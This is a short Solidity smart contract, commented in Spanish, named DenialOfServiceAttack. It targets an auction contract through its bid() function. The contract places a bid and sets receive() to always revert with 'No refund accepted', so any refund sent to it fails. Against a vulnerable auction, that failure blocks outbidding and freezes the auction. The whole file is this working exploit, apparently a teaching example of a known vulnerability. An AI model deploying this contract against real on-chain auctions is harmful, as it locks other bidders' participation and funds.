// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenialOfService {
    function bid() external payable;
}
contract DenialOfServiceAttack {
    // Variables    
    IDenialOfService public target;

    // Constructor
    constructor(address _target) {
        target = IDenialOfService(_target);
    }

    // Rechaza los reembolsos
    receive() external payable {
        revert("No refund accepted");
    }

    // Función que ejecuta el ataque
    function attack() external payable {
        target.bid{value: msg.value}();
    }
}